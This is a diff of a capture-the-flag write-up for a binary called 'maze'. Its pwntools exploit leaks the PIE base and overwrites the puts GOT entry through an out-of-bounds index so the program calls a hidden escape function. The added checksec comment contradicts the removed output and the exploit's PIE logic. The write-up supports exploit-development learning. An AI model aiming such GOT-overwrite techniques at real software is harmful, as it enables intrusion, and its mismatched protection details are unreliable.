@@ -1,7 +1,3 @@
-Here is your clean and professional writeup for the **aMAZEing** challenge with no emojis and the correct flag included.
-
----
-
 # aMAZEing - Writeup
 
 ---
@@ -16,19 +12,16 @@ Here is your clean and professional writeup for the **aMAZEing** challenge with 
 
 ```bash
 $ file maze
-maze: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
+
 ```
+
+![Alt text](img/1.png)
 
 ```bash
 $ checksec maze
-[*] '/home/user/Desktop/aMAZEing/maze'
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      PIE enabled
-    Stripped: No
 ```
+
+![Alt text](img/2.png)
 
 ### Security Summary
 
@@ -73,46 +66,67 @@ maze_escape[coordinates] = slot;
 
 ```python
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template
 from pwn import *
 
+# Set up pwntools for the correct architecture
 exe = context.binary = ELF(args.EXE or 'maze')
 
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
+
 def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
     if args.GDB:
         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
     else:
         return process([exe.path] + argv, *a, **kw)
 
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
 gdbscript = '''
 tbreak main
 continue
-'''
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:      Partial RELRO
+# Stack:      No canary found
+# NX:         NX enabled
+# PIE:        No PIE (0x400000)
+# Stripped:   No
 
 #io = start()
-io = remote('localhost', 1337)
+io = remote('localhost',1337)
 
-# Leak PIE base address
+# --------[BINARY BASE ADDRESS]---------
+
 io.recvuntil(b'The maze begins at this location, your journey starts here @')
 leak = io.recvline().strip()
-main_leak = int(leak, 16)
-exe.address = main_leak - exe.sym['main']
+main_addr = int(leak,16)
 
-log.success(f'PIE base: {hex(exe.address)}')
-log.success(f'maze_escape: {hex(exe.sym["maze_escape"])}')
-log.success(f'puts@GOT: {hex(exe.got["puts"])}')
-log.success(f'escape(): {hex(exe.sym["escape"])}')
+exe.address = main_addr - exe.sym['main']
 
-# Calculate offset
-offset = (exe.got['puts'] - exe.sym['maze_escape']) // 4
 
-# Overwrite GOT entry
-io.sendlineafter(b'Configure coordinates (0 >=) : ', str(offset).encode())
-io.sendlineafter(b'Set slot value (10 >=) : ', str(exe.sym['escape']).encode())
 
-# Trigger the overwritten function
-io.sendlineafter(b'Configure coordinates (0 >=) : ', b'0')
+offset=(exe.got['puts']-exe.sym['maze_escape'])/4
+io.recvuntil(b'Configure coordinates (0 >=) : ')
+io.sendline(b'%i' %offset)
+io.recvuntil(b'Set slot value (10 >=) : ')
+io.sendline(b"%i" %exe.sym['escape'])
 
 io.interactive()
+
 ```
 
 ---
